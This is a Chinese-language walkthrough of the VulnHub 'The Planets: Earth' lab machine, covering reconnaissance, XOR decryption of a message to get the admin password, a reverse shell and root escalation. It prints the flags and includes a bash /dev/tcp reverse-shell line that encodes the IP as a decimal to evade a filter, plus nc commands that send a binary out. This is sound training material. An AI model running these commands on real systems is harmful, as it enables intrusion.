---
title: 'The Planets: Earth'
date: 2025-05-02 14:59:23
description: Vulnhub刷题记录
tags: 
  - Vulnhub
---

## The Planets: Earth

探测出来 IP 是 `192.168.234.144` 起了一个 http 和 https

![](image/Pasted%20image%2020250427160431.png)

扫出来两个域名：`earth.local`、`terratest.earth.local`

![](image/Pasted%20image%2020250429182716.png)

改一下配置文件，Windows 的是 `C:\Windows\System32\drivers\etc\hosts`，Linux 的是 `/etc/hosts`。

注意，如果挂了梯子的，需要关闭梯子或者是改一下 DNS

扫出来几个目录：

```URL
https://earth.local/admin/
https://earth.local/admin/login
https://terratest.earth.local/index.html
https://terratest.earth.local/robots.txt
```

先看 `robots.txt` 

![](image/Pasted%20image%2020250429201316.png)

有一个和其他不一样的东西 `Disallow: /testingnotes.*` 根据名称盲猜后缀是 txt ，访问一下试试，给了一些提示

```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.

安全消息系统测试笔记：  
* 使用异或加密算法，应与 RSA 中使用的算法一样安全。  
* 地球已确认收到我们发送的消息。  
* 使用 testdata.txt 文件测试加密。  
* terra 作为管理员门户的用户名。  
待办事项：  
* 我们如何安全地向地球发送每月密钥？还是应该每周更换密钥？  
* 需要测试不同密钥长度以防范暴力破解。密钥应该多长？  
* 需要改进消息界面和管理员面板的界面，目前非常基础。
```

那就看看 `testdata.txt` 文件：

```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

没有什么新东西了，看看另一个域名，首页有一个先前发送的消息，看看能不能解密一下

```
Previous Messages:

- 37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
- 3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
- 2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
```

前两个 xor 出来都是乱的，只有最后一个是正常的，是 `earthclimatechangebad4humans` 的重复，猜测可能是密钥

![](image/Pasted%20image%2020250429222923.png)

`terra/earthclimatechangebad4humans` 成功登录进管理员界面，是一个 cmd 命令执行框，用户是 apache 用户，连登录权限都没有，试试反弹 shell，过滤点号，点分转一手十进制

```bash
bash -i >& /dev/tcp/3232295553/9099 0>&1
```

然后在 `/var/earth_web` 目录下找到一个 `user_flag.txt` 拿到第一个 flag

> `[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]`

然后搜素准备提权

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
```

![](image/Pasted%20image%2020250430002726.png)

找出来一个奇怪的程序，应该是准备好可以用来提权的，但是执行失败了，nc 传出来分析一下

```bash
# nc 传文件
nc 192.168.234.129 9098 < /usr/bin/reset_root # 受控端
nc -lp 9098 > reset_root # vps

# 分析程序0.
strace -f -F ./reset_root # -f和-F表示同时跟踪fork和vfork出来的进程
ltrace ./reset_root # 用来跟踪进程调用库函数的情况
```

![](image/Pasted%20image%2020250430003223.png)

主要是这三个触发器分别检测 `/dev/shm/kHgTFI5G`、`/dev/shm/Zw7bV9U5`、`/tmp/kcM0Wewe` 这三个文件或者目录是否存在，不存在就不执行，存在就继续执行。那就创建一下，然后再执行。成功拿到密码并提权

![](image/Pasted%20image%2020250430003509.png)

然后在 root 目录下拿到第二个 flag

![](image/Pasted%20image%2020250430002914.png)

> `[root_flag_b0da9554d29db2117b02aa8b66ec492e]`